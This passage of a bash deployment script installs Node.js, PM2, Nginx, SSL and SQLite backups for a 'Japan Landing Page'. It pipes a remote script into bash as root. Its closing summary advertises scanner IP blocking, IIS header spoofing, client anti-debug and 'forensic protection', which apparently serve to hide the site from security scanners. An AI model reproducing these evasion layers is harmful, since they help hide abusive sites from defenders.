if ! command -v node &> /dev/null; then
    curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
    apt install -y nodejs
else
    print_success "Node.js already installed: $(node -v)"
fi

# Step 3: Install PM2
echo -e "${YELLOW}📦 Step 3/10: Installing PM2...${NC}"
npm install -g pm2

# Step 4: Install Nginx
echo -e "${YELLOW}📦 Step 4/10: Installing Nginx...${NC}"
apt install -y nginx

if [ "$ENABLE_ADVANCED_SECURITY" = "yes" ]; then
    setup_nginx_advanced
fi

# Step 5: Download main project
echo -e "${YELLOW}📦 Step 5/10: Downloading main project...${NC}"

# Remove old project if exists
if [ -d "$PROJECT_DIR" ]; then
    echo -e "${YELLOW}⚠️  Removing existing project directory...${NC}"
    rm -rf "$PROJECT_DIR"
fi

# Create project directory
mkdir -p /var/www
cd /var/www

echo -e "${BLUE}📥 Cloning project from Git...${NC}"
echo -e "${CYAN}Repository: $REPO_URL${NC}"

# Clone with error handling
if git clone "$REPO_URL" "$PROJECT_NAME" 2>&1; then
    echo -e "${GREEN}✅ Repository cloned successfully${NC}"
else
    echo -e "${RED}❌ Failed to clone repository${NC}"
    echo -e "${YELLOW}Please check:${NC}"
    echo -e "  1. Repository URL is correct"
    echo -e "  2. You have access permissions"
    echo -e "  3. For SSH URLs, SSH keys are configured"
    echo -e "  4. For private repos, authentication is set up"
    exit 1
fi

# Set permissions
chown -R $SUDO_USER:$SUDO_USER "$PROJECT_DIR" 2>/dev/null || chown -R root:root "$PROJECT_DIR"
cd "$PROJECT_DIR"

# Step 6: Install project dependencies and build
echo -e "${YELLOW}📦 Step 6/10: Installing project dependencies...${NC}"
# Use npm ci if package-lock.json exists, otherwise use npm install
if [ -f "package-lock.json" ]; then
    npm ci --production=false
else
    npm install --production=false
fi

echo -e "${YELLOW}🔨 Building application...${NC}"
npm run build

# Ensure SQLite DB is writable
echo -e "${BLUE}Ensuring SQLite database permissions...${NC}"
if [ -f "$PROJECT_DIR/database/database.sqlite" ]; then
    chmod 664 "$PROJECT_DIR/database/database.sqlite"
    if [ -n "$SUDO_USER" ]; then
        chown $SUDO_USER:$SUDO_USER "$PROJECT_DIR/database/database.sqlite"
    else
        chown root:root "$PROJECT_DIR/database/database.sqlite"
    fi
    print_success "SQLite database permissions normalized"
else
    print_warning "SQLite database not found at $PROJECT_DIR/database/database.sqlite (skipping permission fix)"
fi

# Step 7: Setup environment variables
echo -e "${YELLOW}📝 Step 7/10: Setting up environment variables...${NC}"

# Generate secure random secrets
TOKEN_SECRET=$(openssl rand -hex 32)
ENCRYPTION_KEY=$(openssl rand -hex 32)

if [ ! -f ".env.local" ]; then
    if [ -f "env.production.example" ]; then
        cp env.production.example .env.local
        echo -e "${GREEN}✅ Created .env.local from template${NC}"
    else
        echo -e "${YELLOW}⚠️  env.production.example not found, creating basic .env.local...${NC}"
        cat > .env.local << EOF
# Production Environment Variables
# Auto-generated secrets below - configure other values as needed

NODE_ENV=production
PORT=3000
TOKEN_SECRET=$TOKEN_SECRET
ENCRYPTION_KEY=$ENCRYPTION_KEY

# Fill in these values:
NEXT_PUBLIC_TURNSTILE_SITE_KEY=
TURNSTILE_SECRET_KEY=
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=
ADMIN_PASSWORD=
NEXT_PUBLIC_BASE_URL=https://${DOMAIN}
BASE_URL=https://${DOMAIN}
EOF
    fi
    
    # Update secrets in .env.local
    if grep -q "TOKEN_SECRET=" .env.local; then
        sed -i "s|TOKEN_SECRET=.*|TOKEN_SECRET=$TOKEN_SECRET|" .env.local
    else
        echo "TOKEN_SECRET=$TOKEN_SECRET" >> .env.local
    fi
    
    if grep -q "ENCRYPTION_KEY=" .env.local; then
        sed -i "s|ENCRYPTION_KEY=.*|ENCRYPTION_KEY=$ENCRYPTION_KEY|" .env.local
    else
        echo "ENCRYPTION_KEY=$ENCRYPTION_KEY" >> .env.local
    fi
    
    # Update base URLs if domain is set
    if [[ ! "$DOMAIN" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        PROTOCOL="https"
        if [ "$AUTO_SSL" != "yes" ]; then
            PROTOCOL="http"
        fi
        sed -i "s|NEXT_PUBLIC_BASE_URL=.*|NEXT_PUBLIC_BASE_URL=$PROTOCOL://${DOMAIN}|" .env.local 2>/dev/null || true
        sed -i "s|BASE_URL=.*|BASE_URL=$PROTOCOL://${DOMAIN}|" .env.local 2>/dev/null || true
    fi
    
    echo -e "${GREEN}✅ Auto-generated secure secrets (TOKEN_SECRET, ENCRYPTION_KEY)${NC}"
else
    echo -e "${BLUE}ℹ️  .env.local already exists, skipping...${NC}"
fi

# Step 8: Setup PM2
echo -e "${YELLOW}🚀 Step 8/10: Setting up PM2...${NC}"
mkdir -p /var/log/pm2

# Update ecosystem.config.js with correct path
if [ -f "ecosystem.config.js" ]; then
    sed -i "s|/var/www/[^'\"]*|$PROJECT_DIR|g" ecosystem.config.js
fi

# Start with PM2
pm2 start ecosystem.config.js 2>/dev/null || pm2 start npm --name "$PROJECT_NAME" -- start
pm2 save

# Setup PM2 startup
echo -e "${BLUE}📋 Setting up PM2 to start on boot...${NC}"
STARTUP_CMD=$(pm2 startup 2>&1 | grep -o 'sudo.*' || true)
if [ ! -z "$STARTUP_CMD" ]; then
    eval "$STARTUP_CMD" || true
else
    # Already running as root, setup systemd directly
    env PATH=$PATH:/usr/bin pm2 startup systemd -u root --hp /root 2>&1 | grep -o 'sudo.*' | bash - 2>/dev/null || true
fi

print_success "PM2 configured and application started"

# Step 9: Configure Nginx
echo -e "${YELLOW}🌐 Step 9/10: Configuring NGINX...${NC}"

if [ "$ENABLE_ADVANCED_SECURITY" = "yes" ]; then
    create_nginx_config_advanced "$DOMAIN"
else
    create_nginx_config_basic "$DOMAIN"
fi

# Test and restart Nginx
echo -e "${BLUE}Testing NGINX configuration...${NC}"
if nginx -t 2>/dev/null; then
    echo -e "${GREEN}✅ NGINX configuration is valid${NC}"
    systemctl restart nginx
    echo -e "${GREEN}✅ NGINX restarted${NC}"
else
    echo -e "${YELLOW}⚠️  NGINX test failed (this is normal if SSL certs don't exist yet)${NC}"
    echo -e "${BLUE}ℹ️  Will reload after SSL setup${NC}"
    systemctl reload nginx 2>/dev/null || true
fi

# Step 10: Security layers
echo -e "${YELLOW}🔒 Step 10/10: Configuring security layers...${NC}"

# Setup firewall (Layer 1)
setup_network_firewall

# Setup Fail2Ban (Layer 3)
setup_fail2ban

# Setup Forensic Protection (Layer 7)
setup_forensic_protection

# Step 11: SSL Setup (automatic)
if [ "$AUTO_SSL" = "yes" ]; then
    echo -e "${YELLOW}🔒 Setting up SSL with Let's Encrypt...${NC}"
    
    # Check if domain is IP address
    if [[ "$DOMAIN" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        echo -e "${YELLOW}⚠️  Cannot setup SSL with IP address. Skipping SSL setup.${NC}"
    else
        apt install -y certbot python3-certbot-nginx
        
        # Setup SSL automatically
        certbot --nginx -d "$DOMAIN" -d "www.$DOMAIN" \
            --non-interactive \
            --agree-tos \
            --email "$EMAIL" \
            --redirect || {
            echo -e "${YELLOW}⚠️  SSL setup failed. You can run manually later:${NC}"
            echo -e "${BLUE}   certbot --nginx -d $DOMAIN -d www.$DOMAIN${NC}"
        }
        
        # Enable auto-renewal
        systemctl enable certbot.timer 2>/dev/null || true
        systemctl start certbot.timer 2>/dev/null || true
        
        # Reload NGINX after SSL setup
        systemctl reload nginx 2>/dev/null || systemctl restart nginx
        
        echo -e "${GREEN}✅ SSL certificate installed and auto-renewal enabled${NC}"
    fi
else
    echo -e "${BLUE}ℹ️  SSL setup skipped${NC}"
fi

# Create automated SQLite backup service (daily)
echo -e "${YELLOW}💾 Setting SQLite daily backup...${NC}"
mkdir -p "/var/backups/$PROJECT_NAME"
cat > "/etc/cron.daily/${PROJECT_NAME}_sqlite_backup" <<EOF
#!/bin/bash
sqlite3 "$PROJECT_DIR/database/database.sqlite" ".backup /var/backups/$PROJECT_NAME/db-\$(date +%F).sqlite"
EOF
chmod +x "/etc/cron.daily/${PROJECT_NAME}_sqlite_backup"
print_success "SQLite backup configured (daily)"

# Optional: show SQLite status after deployment
echo -e "${CYAN}Checking SQLite status...${NC}"
if command -v sqlite3 &>/dev/null; then
    sqlite3 "$PROJECT_DIR/database/database.sqlite" "SELECT count(*) FROM links;" 2>/dev/null \
        && echo -e "${GREEN}🟢 SQLite is working${NC}" \
        || echo -e "${RED}🔴 SQLite file not found${NC}"
else
    echo -e "${RED}🔴 sqlite3 CLI not available${NC}"
fi

# Final summary
echo ""
echo -e "${GREEN}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║                                                          ║${NC}"
echo -e "${GREEN}║   ${BOLD}✅ Installation Complete!${NC}${GREEN}                           ║${NC}"
echo -e "${GREEN}║                                                          ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${CYAN}════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}System Information:${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}Domain:${NC}           $DOMAIN"
echo -e "${YELLOW}Application:${NC}      $PROJECT_DIR"
echo -e "${YELLOW}PM2 Name:${NC}         $PROJECT_NAME"
echo -e "${YELLOW}Logs:${NC}             /var/log/pm2/"
echo ""

if [ "$ENABLE_ADVANCED_SECURITY" = "yes" ]; then
    echo -e "${CYAN}════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}Security Layers Activated:${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}✓${NC} Layer 1: Advanced Network Firewall (Scanner IP blocking)"
    echo -e "${GREEN}✓${NC} Layer 2: NGINX with Stealth Headers (IIS spoofing)"
    echo -e "${GREEN}✓${NC} Layer 3: Fail2Ban (Auto-ban malicious IPs)"
    echo -e "${GREEN}✓${NC} Layer 4: Next.js Middleware (Already in code)"
    echo -e "${GREEN}✓${NC} Layer 5: Client Anti-Debug (Already in code)"
    echo -e "${GREEN}✓${NC} Layer 6: Reputation Management (Scanner detection)"
    echo -e "${GREEN}✓${NC} Layer 7: Forensic Protection (Log rotation)"
    echo ""
fi

echo -e "${CYAN}════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}Next Steps:${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "1. ${YELLOW}Configure environment variables:${NC}"
echo -e "   ${BLUE}nano $PROJECT_DIR/.env.local${NC}"
echo -e "   ${YELLOW}(TOKEN_SECRET and ENCRYPTION_KEY are already set)${NC}"
echo ""
echo -e "2. ${YELLOW}Restart the application after configuring:${NC}"
echo -e "   ${BLUE}pm2 restart $PROJECT_NAME${NC}"
echo ""
echo -e "3. ${YELLOW}Check application status:${NC}"
echo -e "   ${BLUE}pm2 status${NC}"
echo -e "   ${BLUE}pm2 logs $PROJECT_NAME${NC}"
echo ""
echo -e "4. ${YELLOW}Access your application:${NC}"
if [[ ! "$DOMAIN" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    if [ "$AUTO_SSL" = "yes" ]; then
        echo -e "   ${GREEN}https://$DOMAIN${NC}"
        echo -e "   ${GREEN}https://www.$DOMAIN${NC}"
    else
        echo -e "   ${GREEN}http://$DOMAIN${NC}"
    fi
else
    echo -e "   ${GREEN}http://$DOMAIN${NC}"
fi
echo ""
echo -e "${CYAN}════════════════════════════════════════════════════════${NC}"
echo -e "${BOLD}Useful Commands:${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════${NC}"
echo -e "   ${BLUE}pm2 restart $PROJECT_NAME${NC}        - Restart app"
echo -e "   ${BLUE}pm2 logs $PROJECT_NAME${NC}           - View logs"
echo -e "   ${BLUE}pm2 monit${NC}                        - Monitor resources"
echo -e "   ${BLUE}systemctl status nginx${NC}           - Check NGINX"
if [ "$ENABLE_ADVANCED_SECURITY" = "yes" ]; then
    echo -e "   ${BLUE}ufw status${NC}                       - Check firewall"
    echo -e "   ${BLUE}fail2ban-client status${NC}           - Check Fail2Ban"
    echo -e "   ${BLUE}fail2ban-client status nginx-honeypot${NC} - View banned IPs"
fi
echo ""
echo -e "${YELLOW}🎉 Your Japan Landing Page is now deployed!${NC}"
echo ""
